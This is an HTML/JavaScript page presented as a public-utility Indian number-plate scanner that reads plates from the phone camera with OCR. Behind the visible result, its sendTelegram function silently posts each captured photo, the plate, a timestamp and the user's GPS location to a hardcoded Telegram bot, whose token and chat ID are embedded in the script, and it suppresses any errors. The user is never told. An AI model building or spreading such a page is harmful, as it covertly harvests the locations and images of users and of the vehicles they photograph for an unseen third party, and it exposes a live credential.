<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Indian Vehicle Number Scanner | Public Utility</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  min-height:100vh;
  background:radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
  font-family:Segoe UI,Arial;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
}
.card{
  width:440px;
  max-width:96%;
  background:rgba(255,255,255,.1);
  backdrop-filter:blur(18px);
  border-radius:24px;
  padding:24px;
  box-shadow:0 40px 80px rgba(0,0,0,.7);
  text-align:center;
}
video{
  width:100%;
  border-radius:16px;
  margin-top:12px;
}
button{
  width:100%;
  margin-top:14px;
  padding:14px;
  border:none;
  border-radius:16px;
  background:#0b5ed7;
  color:#fff;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
}
button:disabled{opacity:.6}
.result{
  margin-top:14px;
  font-size:15px;
  font-weight:600;
}
.good{color:#4ade80}
.bad{color:#f87171}
.small{font-size:12px;opacity:.7;margin-top:6px}
</style>
</head>

<body>

<div class="card">
  <h2>ðŸš˜ Indian Vehicle Scanner</h2>
  <p class="small">Plate â€¢ RTO â€¢ Image â€¢ Location</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none"></canvas>

  <button id="scanBtn" onclick="capture()" disabled>ðŸ“¸ Scan Number Plate</button>

  <div class="result" id="result"></div>
</div>

<script src="https://unpkg.com/tesseract.js@5/dist/tesseract.min.js"></script>

<script>
/* ================= TELEGRAM CONFIG ================= */
const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
const CHAT_ID  = "543961277";

/* ================= ALL INDIA RTO MAP ================= */
const RTO = {
  DL:"Delhi",BR:"Bihar",UP:"Uttar Pradesh",MH:"Maharashtra",WB:"West Bengal",
  RJ:"Rajasthan",HR:"Haryana",PB:"Punjab",KA:"Karnataka",TN:"Tamil Nadu",
  GJ:"Gujarat",MP:"Madhya Pradesh",CG:"Chhattisgarh",JH:"Jharkhand",
  OD:"Odisha",TS:"Telangana",AP:"Andhra Pradesh",KL:"Kerala",AS:"Assam",
  JK:"Jammu & Kashmir",UK:"Uttarakhand",HP:"Himachal Pradesh",GA:"Goa",
  TR:"Tripura",MN:"Manipur",ML:"Meghalaya",MZ:"Mizoram",NL:"Nagaland",
  AR:"Arunachal Pradesh",SK:"Sikkim",PY:"Puducherry",CH:"Chandigarh",
  AN:"Andaman & Nicobar",LD:"Lakshadweep",DN:"Dadra & Nagar Haveli",DD:"Daman & Diu"
};

let lastPlate=null;

/* ================= CAMERA ================= */
navigator.mediaDevices.getUserMedia({video:{facingMode:"environment"}})
.then(stream=>{
  video.srcObject=stream;
  scanBtn.disabled=false;
})
.catch(()=>alert("Camera permission required"));

/* ================= SCAN ================= */
function capture(){
  scanBtn.disabled=true;
  result.innerText="â³ Scanning...";

  canvas.width=video.videoWidth;
  canvas.height=video.videoHeight;
  canvas.getContext("2d").drawImage(video,0,0);

  Tesseract.recognize(canvas,"eng",{
    tessedit_char_whitelist:"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  }).then(({data})=>{
    const clean=data.text.toUpperCase().replace(/[^A-Z0-9]/g," ");
    const match=clean.match(/\b[A-Z]{2}\s?[0-9]{1,2}\s?[A-Z]{1,3}\s?[0-9]{4}\b/);

    if(!match){
      show("âŒ Plate not detected",false);
      return;
    }

    const plate=match[0].replace(/\s+/g,"");
    if(plate===lastPlate){
      show("âš ï¸ Same plate already sent",false);
      return;
    }
    lastPlate=plate;

    processPlate(plate);
  }).finally(()=>scanBtn.disabled=false);
}

/* ================= PROCESS ================= */
function processPlate(plate){
  const stateCode=plate.substring(0,2);
  const state=RTO[stateCode]||"Unknown State";
  const type=plate.length>10?"ðŸš— Car":"ðŸï¸ Bike";

  navigator.geolocation.getCurrentPosition(pos=>{
    const lat=pos.coords.latitude;
    const lon=pos.coords.longitude;
    const map=`https://maps.google.com/?q=${lat},${lon}`;
    sendTelegram(plate,state,type,map);
    show(`âœ… ${plate} | ${state} | ${type}`,true);
  },()=>{
    sendTelegram(plate,state,type,"Location not allowed");
    show(`âœ… ${plate} | ${state} | ${type}`,true);
  });
}

/* ================= UI ================= */
function show(msg,ok){
  result.innerHTML=`<span class="${ok?"good":"bad"}">${msg}</span>`;
}

/* ================= TELEGRAM SEND ================= */
function sendTelegram(plate,state,type,map){
  canvas.toBlob(blob=>{
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("caption",
`ðŸš˜ Vehicle Detected

ðŸ”¢ Number: ${plate}
ðŸ›ï¸ State/RTO: ${state}
ðŸš¦ Type: ${type}
ðŸ•’ Time: ${new Date().toLocaleString()}
ðŸ“ Location: ${map}`);
    fd.append("photo",blob,"vehicle.jpg");

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
      method:"POST",
      body:fd
    }).catch(()=>{});
  },"image/jpeg");
}
</script>

</body>
</html>
